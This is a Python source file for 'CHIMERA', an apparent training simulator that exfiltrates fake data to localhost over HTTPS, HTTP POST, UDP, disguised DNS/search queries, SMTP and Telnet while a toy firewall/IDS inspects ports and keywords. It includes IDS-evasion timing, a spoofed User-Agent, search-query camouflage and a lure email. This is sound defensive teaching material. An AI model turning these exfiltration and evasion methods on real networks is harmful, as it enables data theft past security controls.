import socket, ssl,requests,leaked_data_example,urllib, os
from firewall import MiniFirewallIDS
from dotenv import load_dotenv
from encryption_manager import EncryptionManager
from traffic_pattern_manager import TrafficPattern
HOST = "127.0.0.1"; HTTPS_PORT = 443; HTTPsPOST_PORT=8080; DNS_PORT = 53; UDP_PORT = 5000; SMTP_PORT=25  ;EMAIL_SERVER = "localhost"
DATA_TO_EXFILTRATE = leaked_data_example.get_fake_data()

mini_firewall = MiniFirewallIDS(
    suspicious_word_list=["password", "secret", "internal"],
    max_frag_per_window=6,
    window_seconds=5
)

def telnet(data_fragments):
        print("[*] Attempting Telnet exfiltration...")
        print("[*]That will not be smart option in real life scenario as most of coperations block telnet arleady , same for smtp for emails outside the organization")

        allowed_port, port_reason = mini_firewall.inspect_port(23)
        if not allowed_port:
            print(f"[Firewall] Connection blocked on port {23}: {port_reason}")
            return False

        print(f"[Firewall] Port {23} allowed. Proceeding with data transmission...")
              
def send_https(data_fragments):
    """Exfiltrate data using direct HTTPS (TLS) with proper transmission control."""
    try:
        print("[*] Attempting HTTPS exfiltration...")
        allowed_port, port_reason = mini_firewall.inspect_port(HTTPS_PORT)
        if not allowed_port:
            print(f"[Firewall] Connection blocked on port {HTTPS_PORT}: {port_reason}")
            return False

        print(f"[Firewall] Port {HTTPS_PORT} allowed. Proceeding with data transmission...")
                
        context = ssl.create_default_context()
        context.load_verify_locations("certs/cert.pem")

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secure_socket = context.wrap_socket(client_socket, server_hostname="localhost")
        secure_socket.connect((HOST, HTTPS_PORT))

        for fragment in data_fragments:
            allowed, reason = mini_firewall.inspect_fragment(fragment)
            if not allowed:
                print(f"[Firewall] BLOCKED fragment: {reason}")
                print("Reported to Intrusion Detector")
                return False
            tp.sleep()
            secure_socket.send( fragment.encode())
            resp = secure_socket.recv(1024).decode(errors="ignore")
            print(f"[*] Sent fragment: {fragment}")

        # 🔹 Send "EOF" as final fragment to indicate end of data transfer
        secure_socket.send(b"EOF")
        print("[*] Sent EOF marker.")

        secure_socket.close()
        print("[+] Data exfiltrated via HTTPS.")
        return True

    except ConnectionResetError:
        print("[!] Connection reset by server. The server may be blocking this behavior.")
    except ssl.SSLError as ssl_error:
        print(f"[!] SSL Error: {ssl_error}. Check certificate setup.")
    except Exception as e:
        print(f"[!] HTTPS Blocked: {e}")
    
    return False


def send_httpsPOST(data_fragments):
    """Exfiltrate data using a real HTTP POST request."""
    try:
        print("[*] Attempting HTTPS POST Request exfiltration...")

        allowed_port, port_reason = mini_firewall.inspect_port(HTTPsPOST_PORT)
        if not allowed_port:
            print(f"[Firewall] Connection blocked on port {HTTPsPOST_PORT}: {port_reason}")
            return False

        print(f"[Firewall] Port {HTTPsPOST_PORT} allowed. Proceeding with data transmission...")
                       

        url = "http://127.0.0.1:8080"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        for fragment in data_fragments:
            allowed, reason = mini_firewall.inspect_fragment(fragment)
            if not allowed:
                print(f"[Firewall] BLOCKED fragment: {reason}")
                print("Reported to Intrusion Detector")
                return False
            data = f"message={urllib.parse.quote(fragment)}"  
            response = requests.post(url, headers=headers, data=data.encode())
            print(f"[*] Sent fragment: {fragment}")
            print(f"[+] Server Response: {response.status_code} - {response.text}")
            print(f"[+] Server Response: {response}")            
            tp.sleep()
  
        
        data = f"message={urllib.parse.quote("EOF")}"  
        response = requests.post(url, headers=headers, data=data.encode())

        print("[+] Data exfiltrated via  HTTPS POST.")

        return True
    except Exception as e:
        print(f"[!]  HTTPS POST Request Blocked: {e}")
        return False

# 🔹 Camouflage Mode 3: UDP Exfiltration
def send_udp(data_fragments):
    """Send data over a custom UDP protocol."""
    try:
        print("[*] Attempting UDP exfiltration...")
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        allowed_port, port_reason = mini_firewall.inspect_port(UDP_PORT)
        if not allowed_port:
            print(f"[Firewall] Connection blocked on port {UDP_PORT}: {port_reason}")
            return False

        print(f"[Firewall] Port {UDP_PORT} allowed. Proceeding with data transmission...")
                       

        for fragment in data_fragments:
            allowed, reason = mini_firewall.inspect_fragment(fragment)
            if not allowed:
                print(f"[Firewall] BLOCKED fragment: {reason}")
                print("Reported to Intrusion Detector")
                return False
            client_socket.sendto(fragment.encode(), (HOST, UDP_PORT))
            tp.sleep()

        client_socket.sendto(b"EOF", (HOST, UDP_PORT))

        print("[+] Data exfiltrated via UDP.")
        return True
    except Exception as e:
        print(f"[!] UDP Blocked: {e}")
        return False




def send_dns(data_fragments):
    """Exfiltrate data using Google-like search queries."""
    try:
        print("[*] Attempting DNS exfiltration...")
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        allowed_port, port_reason = mini_firewall.inspect_port(DNS_PORT)
        if not allowed_port:
            print(f"[Firewall] Connection blocked on port {DNS_PORT}: {port_reason}")
            return False

        print(f"[Firewall] Port {DNS_PORT} allowed. Proceeding with data transmission...")
                       
        for fragment in data_fragments:
            allowed, reason = mini_firewall.inspect_fragment(fragment)
            if not allowed:
                print(f"[Firewall] BLOCKED fragment: {reason}")
                print("Reported to Intrusion Detector")
                return False
            dns_query = f"https://www.google.com/search?q={fragment}".encode()  # ✅ Looks like real Google search
            client_socket.sendto(dns_query, (HOST, DNS_PORT))
            print(f"[*] Resolving DNS: {dns_query.decode()}")
            tp.sleep()

        client_socket.sendto(b"https://www.google.com/search?q=EOF", (HOST, DNS_PORT))  # ✅ End marker
        print("[+] Data exfiltrated via Fake Google Searches.")
        return True

    except Exception as e:
        print(f"[!] DNS Blocked: {e}")
        return False
    

    
def send_email(data_fragments):
    """Send exfiltrated data as a single email message."""
    try:
        print("[*] Attempting Email (SMTP) exfiltration...")
        allowed_port, port_reason = mini_firewall.inspect_port(SMTP_PORT)

        encoded_data = data_fragments
        sender_email = "antti.seitovirta@fraktal.fi"
        recipient_email = "juho.mitrunen@fraktal.fi"
        subject = "VPN Patch Follow-up"
        email_body = f"""\
From: {sender_email}
To: {recipient_email}
Subject: {subject}

Dear Juho,
Hope you’re doing well. Just wanted to follow up on the CVE-2025 patch deployment in Fraktal VPN and make sure everything is progressing as planned.
I came across some notes from our last discussion, and I wanted to share them with you:
{encoded_data}
Looking forward to your thoughts.
Best regards,
Antti
"""
        print(f"Attempting to send Email: {email_body}")
        if not allowed_port:
            print(f"[Firewall] Connection blocked on port {SMTP_PORT}: {port_reason}")
            return False
        print(f"[Firewall] Port {SMTP_PORT} allowed. Proceeding with data transmission...")
       
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, SMTP_PORT))
        client_socket.send(email_body.encode())  
        print("[+] Email sent successfully.")

        client_socket.close()
        return True

    except Exception as e:
        print(f"[!] Email Blocked: {e}")
        return False

def adaptive_exfiltration(data_fragments):
    """Try different exfiltration methods dynamically."""
    methods = [telnet,send_email,send_https, send_httpsPOST, send_udp, send_dns]

    for method in methods:
        mini_firewall.reset()

        if method(data_fragments): 
            print(f"[+] Exfiltration successful via {method.__name__}.")
            return True
    print("[!] All exfiltration methods blocked. No successful transmission.")

def menu_selection():
    """Display a menu for the user to select exfiltration method."""
    load_dotenv()
    key = os.environ.get("AES_key")

    if not key:
        raise Exception("AES Key not set. Please check your .env file.")
    data_fragments = EncryptionManager.encode_fragment_data(DATA_TO_EXFILTRATE)
    for i in range(len(data_fragments)):
        data_fragments[i] = EncryptionManager.encrypt(data_fragments[i],key)
    options = {
        "1": ("HTTPS (Direct TLS)", send_https),
        "2": ("HTTPS (POST request)", send_httpsPOST),
        "3": ("UDP Packets", send_udp),
        "4": ("DNS Queries", send_dns),
        "5": ("SMTP (Email Exfiltration)", send_email),
        "6": ("Telnet", telnet),
        "7": ("Adaptive Exfiltration Mode", adaptive_exfiltration),
        "0": ("Exit", None),
    }

    while True:
        print("\n🔹 Select Exfiltration Method:")
        for key, (name, _) in options.items():
            print(f"  [{key}] {name}")

        print("🔥🧱 Firewall events are logged in 'firewall_log.txt' for reference")
        choice = input("\nEnter choice: ").strip()

        if choice in options:
            if choice == "0":
                print("[*] Exiting...")
                break

            if choice == "7":
                adaptive_exfiltration(data_fragments)
                break

            method_name, method_function = options[choice]
            print(f"[*] Selected: {method_name}")

            if method_function(data_fragments):
                print(f"[+] Exfiltration successful via {method_name}.")
                break
            else:
                print(f"[!] {method_name} failed. Try another method.")
        else:
            print("[!] Invalid choice. Please enter a valid option.")

def traffic_pattern_menu():
    """
    Presents a menu for selecting a traffic pattern mode and optionally setting custom delays.
    """
    print("Select Traffic Pattern Mode:")
    print("🔔 Traffic pattern you choose may help to Bypass firewall / Avoid IDS alarms")
    print("1. Stealth Mode (Random delays)")
    print("2. Reliable Mode (Fixed delays)")
    print("3. Custom Pattern (Specify a sequence of delays)")
    choice = input("Enter your choice (1-3): ").strip()

    if choice == "1":
        try:
            random_min = float(input("Enter minimum delay in seconds (default 0.4): ") or "0.4")
            random_max = float(input("Enter maximum delay in seconds (default 2.0): ") or "2.0")
        except ValueError:
            print("Invalid input. Using default random delay values.")
            random_min, random_max = 0.4, 2.0
        tp = TrafficPattern(mode=TrafficPattern.MODE_RANDOM, random_min=random_min, random_max=random_max)
        print("Stealth Mode selected (Random delays).")
    elif choice == "2":
        try:
            fixed_delay = float(input("Enter fixed delay in seconds (default 1.0): ") or "1.0")
        except ValueError:
            print("Invalid input. Using default fixed delay value.")
            fixed_delay = 1.0
        tp = TrafficPattern(mode=TrafficPattern.MODE_FIXED, fixed_delay=fixed_delay)
        print("Reliable Mode selected (Fixed delays).")
    elif choice == "3":
        pattern_input = input("Enter custom delay values separated by commas (e.g., 0.5, 0.8, 1.2): ")
        try:
            custom_pattern = [float(x.strip()) for x in pattern_input.split(",") if x.strip()]
            if not custom_pattern:
                raise ValueError
        except ValueError:
            print("Invalid input. Using default custom pattern [0.5, 0.8, 1.2].")
            custom_pattern = [0.5, 0.8, 1.2]
        tp = TrafficPattern(mode=TrafficPattern.MODE_CUSTOM, custom_pattern=custom_pattern)
        print("Custom Pattern selected.")
    else:
        print("Invalid choice. Defaulting to Stealth Mode (Random delays).")
        tp = TrafficPattern(mode=TrafficPattern.MODE_RANDOM, random_min=0.4, random_max=1.5)
    return tp
def print_ascii_art():
    art = r"""
        ,     \    /      ,        
       / \    )\__/(     / \       
      /   \  (_\  /_)   /   \        
 ____/_____\__\@  @/___/_____\____ 
|             |\../|              |
|              \VV/               |
|        -----CHIMERA----         |
|_________________________________|
 |    /\ /      \\       \ /\    | 
 |  /   V        ))       V   \  | 
 |/     `       //        '     \| 
 `              V                '            
 Polymorphic Exfiltration Simulator
      Mostafa Ghozal - Fraktal

Configure your client malware enviroment :  
      """
    print(art)


if __name__ == "__main__":
    print_ascii_art()
    tp=traffic_pattern_menu()
    menu_selection()
